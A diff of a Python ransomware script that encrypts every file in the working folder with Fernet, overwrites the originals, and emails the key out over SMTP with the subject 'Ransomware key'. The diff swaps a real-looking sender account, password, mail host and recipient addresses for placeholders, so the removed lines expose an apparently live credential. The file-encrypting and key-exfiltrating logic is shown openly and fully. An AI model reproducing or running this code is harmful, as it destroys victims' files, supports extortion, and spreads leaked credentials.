@@ -5,7 +5,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-    if file == "my_file.py" or file == "thekey.key" or file == "decrypt.py":
+    if file == "ransomeware.py" or file == "thekey.key" or file == "decrypt.py":
         continue
 
     if os.path.isfile(file):
@@ -22,11 +22,11 @@ for file in files:
     with open (file, "wb") as thefile:
         thefile.write(contents_encrypted)
 
-gmail_user = 'info@sportcentre.info'
-gmail_password = '(df1v3L^}12n'
+gmail_user = 'emailUser'
+gmail_password = 'password'
 
 sent_from = gmail_user
-to = ['lilko.petkovv@gmail.com', 'lilkoo.petkovv@gmail.com']
+to = ['test1@gmail.com', 'test@gmail.com']
 subject = f'Ransomware key'
 body = key
 
@@ -39,7 +39,7 @@ Subject: %s
 """ % (sent_from, ", ".join(to), subject, body)
 
 try:
-    smtp_server = smtplib.SMTP_SSL('mail.sportcentre.info', 465)
+    smtp_server = smtplib.SMTP_SSL('hostname', 465)
     smtp_server.ehlo()
     smtp_server.login(gmail_user, gmail_password)
     smtp_server.sendmail(sent_from, to, email_text)
